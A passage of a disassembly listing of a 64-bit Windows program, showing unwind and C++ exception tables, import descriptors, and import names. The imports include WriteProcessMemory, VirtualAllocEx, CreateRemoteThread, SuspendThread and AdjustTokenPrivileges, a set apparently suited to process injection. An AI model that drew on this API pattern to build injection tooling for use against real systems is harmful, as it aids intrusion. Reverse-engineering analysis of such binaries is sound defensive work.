UNWIND_CODE <3, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
dd rva __GSHandlerCheck
dd 48h
stru_14000A428 UNWIND_INFO_HDR <21h, 1Dh, 4, 0>
UNWIND_CODE <1Dh, 64h>  ; UWOP_SAVE_NONVOL
dw 10h
UNWIND_CODE <5, 54h>    ; UWOP_SAVE_NONVOL
dw 0Fh
RUNTIME_FUNCTION <rva sub_140004F60, \
                  rva loc_14000506C, \
                  rva stru_14000A414>
stru_14000A440 UNWIND_INFO_HDR <19h, 16h, 8, 0>
UNWIND_CODE <16h, 34h>  ; UWOP_SAVE_NONVOL
dw 0Dh
UNWIND_CODE <16h, 52h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <12h, 0F0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <10h, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Eh, 0C0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Ch, 70h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 60h>  ; UWOP_PUSH_NONVOL
dd rva __CxxFrameHandler4
dd rva byte_14000A45C
byte_14000A45C db 38h   ; FuncInfo4
dd rva byte_14000A469
dd rva byte_14000A47D
dd rva byte_14000A48E
byte_14000A469 db 0Ah   ; num unwind entries: 5
db 0Ah                  ; funclet type: 1
dd rva sub_140005F20    ; funclet
db 40h                  ; frame offset of object ptr to be destructed
db 3Ah                  ; funclet type: 1
dd rva sub_140005D50    ; funclet
db 40h                  ; frame offset of object ptr to be destructed
db 30h                  ; funclet type: 0
db 38h                  ; funclet type: 0
db 7Eh                  ; funclet type: 3
dd rva loc_140006E96    ; funclet
byte_14000A47D db 2     ; num_tryblocks: 1
db 4                    ; lowest state index of try
db 4                    ; highest state index of try
db 6                    ; highest state index of any associated catch
dd rva byte_14000A485   ; list of handlers
byte_14000A485 db 2     ; num_handlers: 1
db 11h
db 80h                  ; adjectives bitfield
dd rva loc_140007358    ; catch code
db 85h, 5               ; continuation address: 0x140005311
byte_14000A48E db 0Ch   ; num_ip2state entries: 6
db 0BEh                 ; ea 0x14000520F
db 0                    ; state -1
db 68h                  ; ea 0x140005243
db 2                    ; state 0
db 0C6h                 ; ea 0x1400052A6
db 6                    ; state 2
db 0D2h                 ; ea 0x14000530F
db 4                    ; state 1
db 4Ch                  ; ea 0x140005335
db 0                    ; state -1
db 50h                  ; ea 0x14000535D
db 0Ah                  ; state 4
db    0
stru_14000A49C UNWIND_INFO_HDR <1, 0Ah, 2, 0>
UNWIND_CODE <0Ah, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <6, 50h>    ; UWOP_PUSH_NONVOL
stru_14000A4A4 UNWIND_INFO_HDR <1, 16h, 4, 0>
UNWIND_CODE <16h, 52h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <12h, 70h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <11h, 60h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <10h, 30h>  ; UWOP_PUSH_NONVOL
stru_14000A4B0 UNWIND_INFO_HDR <1, 3Fh, 7, 0>
UNWIND_CODE <3Fh, 0F4h> ; UWOP_SAVE_NONVOL
dw 5
UNWIND_CODE <3Ah, 0E4h> ; UWOP_SAVE_NONVOL
dw 4
UNWIND_CODE <35h, 34h>  ; UWOP_SAVE_NONVOL
dw 2
UNWIND_CODE <2, 60h>    ; UWOP_PUSH_NONVOL
align 4
stru_14000A4C4 UNWIND_INFO_HDR <21h, 5, 2, 0>
UNWIND_CODE <5, 74h>    ; UWOP_SAVE_NONVOL
dw 3
RUNTIME_FUNCTION <rva sub_140005450, \
                  rva loc_1400054F2, \
                  rva stru_14000A4B0>
stru_14000A4D8 UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva sub_140005450, \
                  rva loc_1400054F2, \
                  rva stru_14000A4B0>
stru_14000A4E8 UNWIND_INFO_HDR <1, 50h, 0Bh, 0>
UNWIND_CODE <50h, 0F4h> ; UWOP_SAVE_NONVOL
dw 7
UNWIND_CODE <4Bh, 0E4h> ; UWOP_SAVE_NONVOL
dw 6
UNWIND_CODE <46h, 64h>  ; UWOP_SAVE_NONVOL
dw 5
UNWIND_CODE <41h, 34h>  ; UWOP_SAVE_NONVOL
dw 4
UNWIND_CODE <5, 0C0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
align 4
stru_14000A504 UNWIND_INFO_HDR <1, 16h, 0Ah, 0>
UNWIND_CODE <16h, 54h>  ; UWOP_SAVE_NONVOL
dw 0Ch
UNWIND_CODE <16h, 34h>  ; UWOP_SAVE_NONVOL
dw 0Bh
UNWIND_CODE <16h, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <12h, 0F0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <10h, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Eh, 0C0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Ch, 70h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 60h>  ; UWOP_PUSH_NONVOL
stru_14000A51C UNWIND_INFO_HDR <1, 0Fh, 6, 0>
UNWIND_CODE <0Fh, 64h>  ; UWOP_SAVE_NONVOL
dw 7
UNWIND_CODE <0Fh, 34h>  ; UWOP_SAVE_NONVOL
dw 6
UNWIND_CODE <0Fh, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <0Bh, 70h>  ; UWOP_PUSH_NONVOL
stru_14000A52C UNWIND_INFO_HDR <19h, 16h, 8, 0>
UNWIND_CODE <16h, 34h>  ; UWOP_SAVE_NONVOL
dw 0Dh
UNWIND_CODE <16h, 52h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <12h, 0F0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <10h, 0E0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Eh, 0C0h> ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Ch, 70h>  ; UWOP_PUSH_NONVOL
UNWIND_CODE <0Bh, 60h>  ; UWOP_PUSH_NONVOL
dd rva __CxxFrameHandler4
dd rva byte_14000A548
byte_14000A548 db 38h   ; FuncInfo4
dd rva byte_14000A469
dd rva byte_14000A555
dd rva byte_14000A566
byte_14000A555 db 2     ; num_tryblocks: 1
db 4                    ; lowest state index of try
db 4                    ; highest state index of try
db 6                    ; highest state index of any associated catch
dd rva byte_14000A55D   ; list of handlers
byte_14000A55D db 2     ; num_handlers: 1
db 11h
db 80h                  ; adjectives bitfield
dd rva loc_140007358    ; catch code
db 95h, 5               ; continuation address: 0x140005CE5
byte_14000A566 db 0Eh   ; num_ip2state entries: 7
db 0AEh                 ; ea 0x140005BD7
db 0                    ; state -1
db 68h                  ; ea 0x140005C0B
db 2                    ; state 0
db 0BAh                 ; ea 0x140005C68
db 6                    ; state 2
db 0A0h                 ; ea 0x140005CB8
db 4                    ; state 1
db 2Ch                  ; ea 0x140005CCE
db 6                    ; state 2
db 68h                  ; ea 0x140005D02
db 4                    ; state 1
db 5Eh                  ; ea 0x140005D31
db 0Ah                  ; state 4
db    0
db    0
db    0
stru_14000A578 UNWIND_INFO_HDR <19h, 6, 2, 0>
UNWIND_CODE <6, 32h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
dd rva __CxxFrameHandler4
dd rva byte_14000A588
byte_14000A588 db 68h   ; FuncInfo4
dd rva byte_14000A591
dd rva byte_14000A597
byte_14000A591 db 2     ; num unwind entries: 1
db 0Eh                  ; funclet type: 3
dd rva loc_140006E96    ; funclet
byte_14000A597 db 2     ; num_ip2state entries: 1
db 68h                  ; ea 0x140005D84
db 2                    ; state 0
db    0
db    0
stru_14000A59C UNWIND_INFO_HDR <1, 9, 4, 0>
UNWIND_CODE <9, 52h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <5, 0E0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
stru_14000A5A8 UNWIND_INFO_HDR <21h, 18h, 8, 0>
UNWIND_CODE <18h, 0F4h> ; UWOP_SAVE_NONVOL
dw 4
UNWIND_CODE <13h, 0C4h> ; UWOP_SAVE_NONVOL
dw 5
UNWIND_CODE <0Eh, 74h>  ; UWOP_SAVE_NONVOL
dw 0Dh
UNWIND_CODE <5, 54h>    ; UWOP_SAVE_NONVOL
dw 0Ch
RUNTIME_FUNCTION <rva sub_140005D90, \
                  rva loc_140005DB9, \
                  rva stru_14000A59C>
stru_14000A5C8 UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva sub_140005D90, \
                  rva loc_140005DB9, \
                  rva stru_14000A59C>
stru_14000A5D8 UNWIND_INFO_HDR <21h, 0, 8, 0>
UNWIND_CODE <0, 0F4h>   ; UWOP_SAVE_NONVOL
dw 4
UNWIND_CODE <0, 0C4h>   ; UWOP_SAVE_NONVOL
dw 5
UNWIND_CODE <0, 74h>    ; UWOP_SAVE_NONVOL
dw 0Dh
UNWIND_CODE <0, 54h>    ; UWOP_SAVE_NONVOL
dw 0Ch
RUNTIME_FUNCTION <rva sub_140005D90, \
                  rva loc_140005DB9, \
                  rva stru_14000A59C>
stru_14000A5F8 UNWIND_INFO_HDR <19h, 4, 1, 0>
UNWIND_CODE <4, 42h>    ; UWOP_ALLOC_SMALL
align 4
dd rva __CxxFrameHandler4
dd rva byte_14000A608
byte_14000A608 db 60h   ; FuncInfo4
dd rva byte_14000A60D
byte_14000A60D db 2     ; num_ip2state entries: 1
db 36h                  ; ea 0x140005F3B
db 0                    ; state -1
stru_14000A610 UNWIND_INFO_HDR <21h, 13h, 6, 0>
UNWIND_CODE <13h, 0F4h> ; UWOP_SAVE_NONVOL
dw 4
UNWIND_CODE <0Eh, 74h>  ; UWOP_SAVE_NONVOL
dw 5
UNWIND_CODE <5, 54h>    ; UWOP_SAVE_NONVOL
dw 0Ch
RUNTIME_FUNCTION <rva sub_140005F50, \
                  rva loc_140005F79, \
                  rva stru_14000A59C>
stru_14000A62C UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva sub_140005F50, \
                  rva loc_140005F79, \
                  rva stru_14000A59C>
stru_14000A63C UNWIND_INFO_HDR <21h, 0, 6, 0>
UNWIND_CODE <0, 0F4h>   ; UWOP_SAVE_NONVOL
dw 4
UNWIND_CODE <0, 74h>    ; UWOP_SAVE_NONVOL
dw 5
UNWIND_CODE <0, 54h>    ; UWOP_SAVE_NONVOL
dw 0Ch
RUNTIME_FUNCTION <rva sub_140005F50, \
                  rva loc_140005F79, \
                  rva stru_14000A59C>
stru_14000A658 UNWIND_INFO_HDR <1, 0Bh, 6, 0>
UNWIND_CODE <0Bh, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <7, 0F0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 50h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
stru_14000A668 UNWIND_INFO_HDR <21h, 5, 2, 0>
UNWIND_CODE <5, 0E4h>   ; UWOP_SAVE_NONVOL
dw 0Dh
RUNTIME_FUNCTION <rva sub_1400060C0, \
                  rva loc_14000611F, \
                  rva stru_14000A658>
stru_14000A67C UNWIND_INFO_HDR <21h, 0, 0, 0>
RUNTIME_FUNCTION <rva sub_1400060C0, \
                  rva loc_14000611F, \
                  rva stru_14000A658>
stru_14000A68C UNWIND_INFO_HDR <21h, 0, 2, 0>
UNWIND_CODE <0, 0E4h>   ; UWOP_SAVE_NONVOL
dw 0Dh
RUNTIME_FUNCTION <rva sub_1400060C0, \
                  rva loc_14000611F, \
                  rva stru_14000A658>
stru_14000A6A0 UNWIND_INFO_HDR <1, 0, 0, 0>
stru_14000A6A4 UNWIND_INFO_HDR <9, 0Fh, 6, 0>
UNWIND_CODE <0Fh, 64h>  ; UWOP_SAVE_NONVOL
dw 9
UNWIND_CODE <0Fh, 34h>  ; UWOP_SAVE_NONVOL
dw 8
UNWIND_CODE <0Fh, 52h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <0Bh, 70h>  ; UWOP_PUSH_NONVOL
dd rva __C_specific_handler
dd 2
C_SCOPE_TABLE <rva loc_140006489, \
               rva loc_140006591, \
               rva loc_1400073A0, \
               rva loc_140006591>
C_SCOPE_TABLE <rva loc_1400065C5, \
               rva loc_1400065D7, \
               rva loc_1400073A0, \
               rva loc_140006591>
stru_14000A6DC UNWIND_INFO_HDR <9, 4, 1, 0>
UNWIND_CODE <4, 22h>    ; UWOP_ALLOC_SMALL
align 4
dd rva __C_specific_handler
dd 1
C_SCOPE_TABLE <rva loc_140006787, \
               rva loc_14000680A, \
               rva loc_1400073C0, \
               rva loc_14000680A>
stru_14000A6FC UNWIND_INFO_HDR <1, 2, 1, 0>
UNWIND_CODE <2, 50h>    ; UWOP_PUSH_NONVOL
align 4
stru_14000A704 UNWIND_INFO_HDR <1, 9, 4, 0>
UNWIND_CODE <9, 12h>    ; UWOP_ALLOC_SMALL
UNWIND_CODE <5, 0E0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 60h>    ; UWOP_PUSH_NONVOL
stru_14000A710 UNWIND_INFO_HDR <21h, 9Fh, 4, 0>
UNWIND_CODE <9Fh, 54h>  ; UWOP_SAVE_NONVOL
dw 8
UNWIND_CODE <5, 34h>    ; UWOP_SAVE_NONVOL
dw 7
RUNTIME_FUNCTION <rva sub_140006BD0, \
                  rva loc_140006BDB, \
                  rva stru_14000A704>
stru_14000A728 UNWIND_INFO_HDR <21h, 0, 2, 0>
UNWIND_CODE <0, 54h>    ; UWOP_SAVE_NONVOL
dw 8
RUNTIME_FUNCTION <rva sub_140006BD0, \
                  rva loc_140006BDB, \
                  rva stru_14000A704>
align 20h
stru_14000A740 UNWIND_INFO_HDR <1, 0, 0, 0>
align 8
stru_14000A748 UNWIND_INFO_HDR <1, 0, 0, 0>
stru_14000A74C UNWIND_INFO_HDR <1, 40h, 8, 0>
UNWIND_CODE <40h, 74h>  ; UWOP_SAVE_NONVOL
dw 6
UNWIND_CODE <0Fh, 54h>  ; UWOP_SAVE_NONVOL
dw 8
UNWIND_CODE <0Fh, 34h>  ; UWOP_SAVE_NONVOL
dw 7
UNWIND_CODE <0Fh, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <0Bh, 60h>  ; UWOP_PUSH_NONVOL
stru_14000A760 UNWIND_INFO_HDR <1, 0Bh, 6, 0>
UNWIND_CODE <0Bh, 32h>  ; UWOP_ALLOC_SMALL
UNWIND_CODE <7, 0E0h>   ; UWOP_PUSH_NONVOL
UNWIND_CODE <5, 70h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <4, 60h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <3, 50h>    ; UWOP_PUSH_NONVOL
UNWIND_CODE <2, 30h>    ; UWOP_PUSH_NONVOL
; const _ThrowInfo _TI2_AVbad_alloc_std__
__TI2?AVbad_alloc@std@@ _ThrowInfo <0, 1120h, 0, 0A790h> ; attributes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
__CTA2?AVbad_alloc@std@@ dd 2 ; count of catchable type addresses following
dd rva __CT??_R0?AVbad_alloc@std@@@8_1400011D0 ; catchable type 'class std::bad_alloc'
dd rva __CT??_R0?AVexception@std@@@8_140001070 ; catchable type 'class std::exception'
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
__CTA3?AVbad_array_new_length@std@@ dd 3 ; count of catchable type addresses following
dd rva __CT??_R0?AVbad_array_new_length@std@@@8_140001190 ; catchable type 'class std::bad_array_new_length'
dd rva __CT??_R0?AVbad_alloc@std@@@8_1400011D0 ; catchable type 'class std::bad_alloc'
dd rva __CT??_R0?AVexception@std@@@8_140001070 ; catchable type 'class std::exception'
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
__CT??_R0?AVbad_array_new_length@std@@@8_140001190 dd 0 ; attributes
dd rva ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length `RTTI Type Descriptor'
dd 0                    ; mdisp
dd -1                   ; pdisp
dd 0                    ; vdisp
dd 24                   ; size of thrown object
dd rva sub_140001190    ; reference to optional copy constructor
align 10h
__CT??_R0?AVbad_alloc@std@@@8_1400011D0 dd CT_IsStdBadAlloc ; attributes
dd rva ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc `RTTI Type Descriptor'
dd 0                    ; mdisp
dd -1                   ; pdisp
dd 0                    ; vdisp
dd 24                   ; size of thrown object
dd rva sub_1400011D0    ; reference to optional copy constructor
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
__CT??_R0?AVexception@std@@@8_140001070 dd 0 ; attributes
dd rva ??_R0?AVexception@std@@@8 ; std::exception `RTTI Type Descriptor'
dd 0                    ; mdisp
dd -1                   ; pdisp
dd 0                    ; vdisp
dd 24                   ; size of thrown object
dd rva sub_140001070    ; reference to optional copy constructor
align 20h
; const _ThrowInfo _TI3_AVbad_array_new_length_std__
__TI3?AVbad_array_new_length@std@@ _ThrowInfo <0, 1120h, 0, 0A7A8h> ; attributes
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
__IMPORT_DESCRIPTOR_KERNEL32 dd rva off_14000A9A8 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aKernel32Dll     ; DLL Name
dd rva lstrlenW         ; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_14000AC48 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aUser32Dll       ; DLL Name
dd rva GetClassNameW    ; Import Address Table
__IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_14000A988 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aAdvapi32Dll     ; DLL Name
dd rva AdjustTokenPrivileges ; Import Address Table
__IMPORT_DESCRIPTOR_ole32 dd rva off_14000AE80 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aOle32Dll        ; DLL Name
dd rva CoInitializeEx   ; Import Address Table
__IMPORT_DESCRIPTOR_OLEAUT32 dd rva qword_14000AC28 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aOleaut32Dll     ; DLL Name
dd rva SysAllocString   ; Import Address Table
__IMPORT_DESCRIPTOR_MSVCP140 dd rva off_14000AB50 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aMsvcp140Dll     ; DLL Name
dd rva ??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UEAA@XZ ; Import Address Table
__IMPORT_DESCRIPTOR_VCRUNTIME140_1 dd rva off_14000AD40 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aVcruntime1401D  ; DLL Name
dd rva __imp___CxxFrameHandler4 ; Import Address Table
__IMPORT_DESCRIPTOR_VCRUNTIME140 dd rva off_14000ACD8 ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aVcruntime140Dl  ; DLL Name
dd rva __std_exception_destroy ; Import Address Table
dd rva off_14000AD50    ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aApiMsWinCrtHea  ; DLL Name
dd rva __imp__callnewh  ; Import Address Table
dd rva off_14000AE30    ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aApiMsWinCrtStd  ; DLL Name
dd rva __imp__set_fmode ; Import Address Table
dd rva off_14000AE50    ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aApiMsWinCrtStr  ; DLL Name
dd rva towupper         ; Import Address Table
dd rva off_14000AD98    ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aApiMsWinCrtRun  ; DLL Name
dd rva __imp__initterm  ; Import Address Table
dd rva off_14000AD88    ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aApiMsWinCrtMat  ; DLL Name
dd rva __imp___setusermatherr ; Import Address Table
dd rva off_14000AD78    ; Import Name Table
dd 0                    ; Time stamp
dd 0                    ; Forwarder Chain
dd rva aApiMsWinCrtLoc  ; DLL Name
dd rva __imp__configthreadlocale ; Import Address Table
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
;
; Import names for ADVAPI32.dll
;
off_14000A988 dq rva word_14000B358
dq rva word_14000B370
dq rva word_14000B344
dq 0
;
; Import names for KERNEL32.dll
;
off_14000A9A8 dq rva word_14000AEFC
dq rva word_14000AF08
dq rva word_14000AF14
dq rva word_14000AF20
dq rva word_14000AF30
dq rva word_14000AF44
dq rva word_14000AF5A
dq rva word_14000AF6A
dq rva word_14000AF82
dq rva word_14000AF9E
dq rva word_14000AFB0
dq rva word_14000AFC0
dq rva word_14000AFD0
dq rva word_14000AFE0
dq rva word_14000AFF6
dq rva word_14000B004
dq rva word_14000B01A
dq rva word_14000B02A
dq rva word_14000B03E
dq rva word_14000B04C
dq rva word_14000B068
dq rva word_14000B070
dq rva word_14000B080
dq rva word_14000B092
dq rva word_14000AEE8
dq rva word_14000B0AC
dq rva word_14000B0BE
dq rva word_14000B0CC
dq rva word_14000B0DC
dq rva word_14000B0EE
dq rva word_14000B0FE
dq rva word_14000B11C
dq rva word_14000B12E
dq rva word_14000B140
dq rva word_14000B156
dq rva word_14000B168
dq rva word_14000B17C
dq rva word_14000B188
dq rva word_14000B19E
dq rva word_14000B1AE
dq rva word_14000B1CC
dq rva word_14000B1DC
dq rva word_14000B1EC
dq rva word_14000AED0
dq rva word_14000BE8A
dq rva word_14000BE74
dq rva word_14000BE5A
dq rva word_14000BE44
dq rva word_14000BE2A
dq rva word_14000AEBE
dq rva word_14000B09E
dq rva word_14000AEA8
dq 0
;
; Import names for MSVCP140.dll
;
off_14000AB50 dq rva word_14000B9F2
dq rva word_14000BA2E
dq rva word_14000B962
dq rva word_14000B922
dq rva word_14000B8D4
dq rva word_14000B9B0
dq rva word_14000B88C
dq rva word_14000B844
dq rva word_14000B804
dq rva word_14000B7BE
dq rva word_14000B77C
dq rva word_14000B73C
dq rva word_14000B700
dq rva word_14000B6CA
dq rva word_14000B65E
dq rva word_14000B3FA
dq rva word_14000B41C
dq rva word_14000B458
dq rva word_14000B47E
dq rva word_14000B4A0
dq rva word_14000B4DC
dq rva word_14000B51A
dq rva word_14000B55E
dq rva word_14000B59E
dq rva word_14000B5D4
dq rva word_14000B616
dq 0
;
; Import names for OLEAUT32.dll
;
qword_14000AC28 dq 8000000000000002h
dq 8000000000000009h
dq 8000000000000008h
dq 0
;
; Import names for USER32.dll
;
off_14000AC48 dq rva word_14000B22C
dq rva word_14000B208
dq rva word_14000B220
dq rva word_14000B23C
dq rva word_14000B24C
dq rva word_14000B31C
dq rva word_14000B30A
dq rva word_14000B2F8
dq rva word_14000B2E6
dq rva word_14000B2D2
dq rva word_14000B2C0
dq rva word_14000B2AC
dq rva word_14000B2A0
dq rva word_14000B28C
dq rva word_14000B27C
dq rva word_14000B26E
dq rva word_14000B25A
dq 0
;
; Import names for VCRUNTIME140.dll
;
off_14000ACD8 dq rva word_14000BA72
dq rva word_14000BA8C
dq rva word_14000BAA4
dq rva word_14000BAAE
dq rva word_14000BAC0
dq rva word_14000BACA
dq rva word_14000BAE2
dq rva word_14000BEBC
dq rva word_14000BAF8
dq rva word_14000BB0E
dq rva word_14000BEB2
dq rva word_14000BEA8
dq 0
;
; Import names for VCRUNTIME140_1.dll
;
off_14000AD40 dq rva word_14000BA5C
dq 0
;
; Import names for api-ms-win-crt-heap-l1-1-0.dll
;
off_14000AD50 dq rva word_14000BB94
dq rva word_14000BBA0
dq rva word_14000BBAA
dq rva word_14000BCF2
dq 0
;
; Import names for api-ms-win-crt-locale-l1-1-0.dll
;
off_14000AD78 dq rva word_14000BCDC
dq 0
;
; Import names for api-ms-win-crt-math-l1-1-0.dll
;
off_14000AD88 dq rva word_14000BBD4
dq 0
;
; Import names for api-ms-win-crt-runtime-l1-1-0.dll
;
off_14000AD98 dq rva word_14000BC46
dq rva word_14000BC52
dq rva word_14000BC60
dq rva word_14000BC68
dq rva word_14000BC24
dq rva word_14000BC7E
dq rva word_14000BC8C
dq rva word_14000BC9A
dq rva word_14000BCA4
dq rva word_14000BCAE
dq rva word_14000BBE8
dq rva word_14000BBB2
dq rva word_14000BC02
dq rva word_14000BD12
dq rva word_14000BD2E
dq rva word_14000BD4A
dq rva word_14000BD58
dq rva word_14000BBC4
dq 0
;
; Import names for api-ms-win-crt-stdio-l1-1-0.dll
;
off_14000AE30 dq rva word_14000BC70
dq rva word_14000BD02
dq rva word_14000BB52
dq 0
;
; Import names for api-ms-win-crt-string-l1-1-0.dll
;
off_14000AE50 dq rva word_14000BB88
dq rva word_14000BB7C
dq rva word_14000BB70
dq rva word_14000BEC6
dq rva word_14000BED0
dq 0
;
; Import names for ole32.dll
;
off_14000AE80 dq rva word_14000B3D0
dq rva word_14000B3A8
dq rva word_14000B3BC
dq rva word_14000B396
dq 0
word_14000AEA8 dw 66Ch
db 'WriteProcessMemory',0
align 2
word_14000AEBE dw 61Dh
db 'VirtualProtect',0
align 10h
word_14000AED0 dw 15Ah
db 'EnterCriticalSection',0
align 8
word_14000AEE8 dw 244h
db 'GetCurrentProcess',0
word_14000AEFC dw 691h
db 'lstrlenW',0
align 8
word_14000AF08 dw 663h
db 'WriteFile',0
word_14000AF14 dw 68Eh
db 'lstrcpynW',0
word_14000AF20 dw 617h
db 'VirtualAlloc',0
align 10h
word_14000AF30 dw 5DBh
db 'TerminateProcess',0
align 4
word_14000AF44 dw 2A4h
db 'GetModuleFileNameW',0
align 2
word_14000AF5A dw 5ECh
db 'Thread32Next',0
align 2
word_14000AF6A dw 3F3h
db 'LeaveCriticalSection',0
align 2
word_14000AF82 dw 398h
db 'InitializeCriticalSection',0
word_14000AF9E dw 56Bh
db 'SetFilePointer',0
align 10h
word_14000AFB0 dw 32Ch
db 'GetTempPathW',0
align 20h
word_14000AFC0 dw 0F9h
db 'CreateMutexW',0
align 10h
word_14000AFD0 dw 5EBh
db 'Thread32First',0
word_14000AFE0 dw 628h
db 'WaitForSingleObject',0
word_14000AFF6 dw 0E9h
db 'CreateFileW',0
word_14000B004 dw 273h
db 'GetFileAttributesW',0
align 2
word_14000B01A dw 5D4h
db 'SuspendThread',0
word_14000B02A dw 2A5h
db 'GetModuleHandleA',0
align 2
word_14000B03E dw 442h
db 'OpenProcess',0
word_14000B04C dw 11Bh
db 'CreateToolhelp32Snapshot',0
align 8
word_14000B068 dw 5CBh
db 'Sleep',0
word_14000B070 dw 290h
db 'GetLastError',0
align 20h
word_14000B080 dw 464h
db 'Process32NextW',0
align 2
word_14000B092 dw 682h
db 'lstrcatW',0
align 2
word_14000B09E dw 139h
db 'DeleteFileW',0
word_14000B0AC dw 462h
db 'Process32FirstW',0
word_14000B0BE dw 0A0h
db 'CloseHandle',0
word_14000B0CC dw 112h
db 'CreateThread',0
align 4
word_14000B0DC dw 41Ah
db 'Module32FirstW',0
align 2
word_14000B0EE dw 291h
db 'GetLocalTime',0
align 2
word_14000B0FE dw 14h
db 'AddVectoredExceptionHandler',0
word_14000B11C dw 2E0h
db 'GetProcAddress',0
align 2
word_14000B12E dw 618h
db 'VirtualAllocEx',0
align 20h
word_14000B140 dw 245h
db 'GetCurrentProcessId',0
word_14000B156 dw 105h
db 'CreateProcessW',0
align 8
word_14000B168 dw 2A8h
db 'GetModuleHandleW',0
align 4
word_14000B17C dw 0C8h
db 'CopyFileW',0
word_14000B188 dw 107h
db 'CreateRemoteThread',0
align 2
word_14000B19E dw 41Ch
db 'Module32NextW',0
word_14000B1AE dw 47Dh
db 'QueryFullProcessImageNameW',0
align 4
word_14000B1CC dw 61Bh
db 'VirtualFreeEx',0
word_14000B1DC dw 33Fh
db 'GetTickCount',0
align 4
word_14000B1EC dw 449h
db 'OpenThread',0
align 2
aKernel32Dll db 'KERNEL32.dll',0
align 8
word_14000B208 dw 205h
db 'GetWindowTextLengthA',0
align 20h
word_14000B220 dw 412h
db 'wsprintfW',0
word_14000B22C dw 13Ah
db 'GetClassNameW',0
word_14000B23C dw 32Ch
db 'SendMessageA',0
align 4
word_14000B24C dw 26Ah
db 'LoadCursorW',0
word_14000B25A dw 3D6h
db 'TranslateMessage',0
align 2
word_14000B26E dw 113h
db 'EnumWindows',0
word_14000B27C dw 2BBh
db 'PeekMessageW',0
align 4
word_14000B28C dw 0C2h
db 'DispatchMessageW',0
align 20h
word_14000B2A0 dw 258h
db 'IsWindow',0
align 4
word_14000B2AC dw 2F1h
db 'RegisterClassExW',0
align 20h
word_14000B2C0 dw 7Bh
db 'CreateWindowExW',0
word_14000B2D2 dw 398h
db 'SetWindowLongPtrW',0
word_14000B2E6 dw 25Fh
